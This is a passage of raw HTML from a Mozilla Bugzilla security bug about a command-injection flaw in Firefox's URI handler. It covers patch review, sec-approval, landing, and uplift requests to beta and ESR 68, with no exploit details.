<a href="https://searchfox.org/mozilla-central/rev/428cf94f4ddfb80eebc6028023a7d89eb277791b/browser/components/BrowserContentHandler.jsm#846-848" rel="nofollow">https://searchfox.org/mozilla-central/rev/428cf94f4ddfb80eebc6028023a7d89eb277791b/browser/components/BrowserContentHandler.jsm#846-848</a></p>
</div><div class="activity"><div class="change">Flags: needinfo?(gijskruitbosch+bugs)</div></div></div><div class="change-set" id="c26"><div class="comment" data-id="14310269" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a585184_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 16:34 PDT" data-time="1566257692">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-26" data-comment-id="14310269" data-ismarkdown="true" ><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c25" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #25</a>)</p>
<blockquote>
<p>Do we need to worry about BrowserContentHandler.jsm?<br>
<a href="https://searchfox.org/mozilla-central/rev/428cf94f4ddfb80eebc6028023a7d89eb277791b/browser/components/BrowserContentHandler.jsm#846-848" rel="nofollow">https://searchfox.org/mozilla-central/rev/428cf94f4ddfb80eebc6028023a7d89eb277791b/browser/components/BrowserContentHandler.jsm#846-848</a></p>
</blockquote>
<p>I don&#39;t think it&#39;s critical, but I can update this bit of code while we&#39;re here. I&#39;ve attached a second patch that does this.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(gijskruitbosch+bugs)</span></div></div></div><div class="change-set" id="c27"><div class="comment" data-id="14310272" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a585184_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a585184_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-19 16:35 PDT" data-time="1566257759">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9086547"
         class="attachment"
         data-id="9086547" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D42580-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9086547" itemprop="contentUrl">
        <span id="att-9086547-description" itemprop="description">Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop</span></a>
        — <a href="attachment.cgi?id=9086547&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-27" data-comment-id="14310272" data-ismarkdown="true" ><p>Depends on D42311</p>
</div></div><div class="change-set" id="a945949_538805"><div class="change" id="aa945949_538805">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a945949_538805"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_538805" id="a945949_538805"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a945949_538805"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a945949_538805">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a945949_538805">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-20 11:28 PDT" data-time="1566325687">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=isnotempty">status-firefox70</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=affected">affected</a></div></div></div><div class="change-set" id="c28"><div class="comment" data-id="14311999" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a945949_538805"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a945949_538805"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-20 12:51 PDT" data-time="1566330677">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-28" data-comment-id="14311999" data-ismarkdown="true" ><p>Per discussion with Gijs, we&#39;re definitely going to want some additional QA testing around this after it lands:</p>
<blockquote>
<p>mostly to smoketest &quot;if you install/update Firefox that&#39;s the default browser and open links from word/email client/whatever, do things work?</p>
</blockquote>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=isnotempty">status-firefox68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=unaffected">unaffected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=isnotempty">tracking-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=isnotempty">tracking-firefox70</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=isnotempty">tracking-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=69%2B">69+</a></div><div class="change">Flags: qe-verify+</div></div></div><div class="change-set" id="c29"><div class="comment" data-id="14312007" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a945949_538805"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a945949_538805"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-20 12:55 PDT" data-time="1566330956">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-29" data-comment-id="14312007" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9086057" name="attach_9086057" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">attachment 9086057</a> <a href="/attachment.cgi?id=9086057&amp;action=edit" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">Bug 1572838</a> - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</p>
<p>Sec-approval+ for trunk. We&#39;ll want branch and ESR patches as well.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c30"><div class="comment" data-id="14312057" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a945949_538805"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a945949_538805"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-20 13:19 PDT" data-time="1566332398">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-30" data-comment-id="14312057" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/integration/autoland/rev/bb2690f953d6b6d77cf89daf6b425929f495f560" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/bb2690f953d6b6d77cf89daf6b425929f495f560</a><br>
<a href="https://hg.mozilla.org/integration/autoland/rev/43a837ab3e86ae321a2de0cfd27fc08977721a21" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/43a837ab3e86ae321a2de0cfd27fc08977721a21</a></p>
</div></div><div class="change-set" id="c31"><div class="comment" data-id="14313014" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a945949_538805"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a945949_538805"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 02:04 PDT" data-time="1566378287">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-31" data-comment-id="14313014" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/mozilla-central/rev/bb2690f953d6" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/bb2690f953d6</a><br>
<a href="https://hg.mozilla.org/mozilla-central/rev/43a837ab3e86" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/43a837ab3e86</a></p>
</div><div class="activity"><div class="change">Group: firefox-core-security &rarr; core-security-release</div><div class="change">Status: ASSIGNED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2019-08-21 02:04 PDT" data-time="1566378287">2 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=isnotempty">status-firefox70</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla70</div></div></div><div class="change-set" id="c32"><div class="comment" data-id="14313095" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a945949_538805"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a945949_538805"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 02:45 PDT" data-time="1566380728">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-32" data-comment-id="14313095" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9086057" name="attach_9086057" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">attachment 9086057</a> <a href="/attachment.cgi?id=9086057&amp;action=edit" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">Bug 1572838</a> - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</p>
<h3>Beta/Release Uplift Approval Request</h3>
<ul>
<li><strong>User impact if declined</strong>: Security issue as described.</li>
<li><strong>Is this code covered by automated tests?</strong>: No</li>
<li><strong>Has the fix been verified in Nightly?</strong>: No</li>
<li><strong>Needs manual test from QE?</strong>: Yes</li>
<li><strong>If yes, steps to reproduce</strong>: We should smoketest whether installing (or updating an existing install) of nightly/beta etc. still opens links from external applications (mail clients, word documents, the like) correctly.</li>
<li><strong>List of other uplifts needed</strong>: None</li>
<li><strong>Risk to taking this patch</strong>: Medium</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: I can&#39;t deny it&#39;s not late in the game for this kind of change, but we&#39;re unlikely to shake out real regressions on beta/nightly anyway, so it&#39;s doubtful whether we&#39;d gain anything from waiting (certainly now the fixes have landed on central). This was discussed prior to the sec-approval and landing.</li>
</ul>
<p>Note that the patches graft cleanly to beta for me.</p>
<ul>
<li><strong>String changes made/needed</strong>: Nope</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="a1000992_159069"><div class="change" id="aa1000992_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a1000992_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a1000992_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1000992_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1000992_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1000992_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 02:45 PDT" data-time="1566380730">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="c33"><div class="comment" data-id="14313102" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a1000992_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a1000992_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 02:51 PDT" data-time="1566381067">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1572838&amp;comment_id=14313102"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-33" data-comment-id="14313102" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9086057" name="attach_9086057" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">attachment 9086057</a> <a href="/attachment.cgi?id=9086057&amp;action=edit" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">Bug 1572838</a> - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</p>
<h3>ESR Uplift Approval Request</h3>
<ul>
<li><strong>If this is not a sec:{high,crit} bug, please state case for ESR consideration</strong>: sec-crit</li>
<li><strong>User impact if declined</strong>: See above.</li>
<li><strong>Fix Landed on Version</strong>: 70, uplifting to 69</li>
<li><strong>Risk to taking this patch</strong>: Medium</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: This alters commandline arg processing and may affect opening Firefox for http(s) links from other apps. We should test carefully, but assuming I haven&#39;t messed up, this is fine for the &quot;normal&quot; case of how Firefox is installed and used. If enterprises have done crazy things here in terms of manipulating how Firefox is opened from other apps using the commandline... all bets are off. But there&#39;s no realistic way to find out (esp. given paucity of telemetry from enterprise envs) other than landing the patch and seeing what happens...</li>
<li><strong>String or UUID changes made by this patch</strong>: nope</li>
</ul>
<p>Note: the patches graft cleanly to esr68, too.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: approval-mozilla-esr68?</div></div></div><div class="change-set" id="a1001332_159069"><div class="change" id="aa1001332_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a1001332_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a1001332_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1001332_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1001332_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1001332_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 02:51 PDT" data-time="1566381070">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086547&amp;action=edit"
           title="Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop"
           class=""
        >Attachment #9086547</a> -
        Flags: approval-mozilla-esr68?</div></div></div><div class="change-set" id="c34"><div class="comment" data-id="14313447" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a1001332_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a1001332_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 06:17 PDT" data-time="1566393425">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-34" data-comment-id="14313447" data-ismarkdown="true" ><p>Mike, I don&#39;t suppose you have an inkling of whether enterprise users are likely to mess with our registry entries that would be used by Windows to deal with URLs from other apps?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(mozilla)</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="14313587" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1001332_159069"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a1001332_159069"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-21 07:15 PDT" data-time="1566396938">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-35" data-comment-id="14313587" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9086057" name="attach_9086057" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">attachment 9086057</a> <a href="/attachment.cgi?id=9086057&amp;action=edit" title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">Bug 1572838</a> - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</p>
<p>Approved for 69.0b16 and 68.1esr.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: <span class="activity-deleted">approval-mozilla-esr68?</span></div><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
        Flags: approval-mozilla-esr68+</div><div class="change">
        <a href="/attachment.cgi?id=9086057&amp;action=edit"
           title="Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!"
           class=""
        >Attachment #9086057</a> -
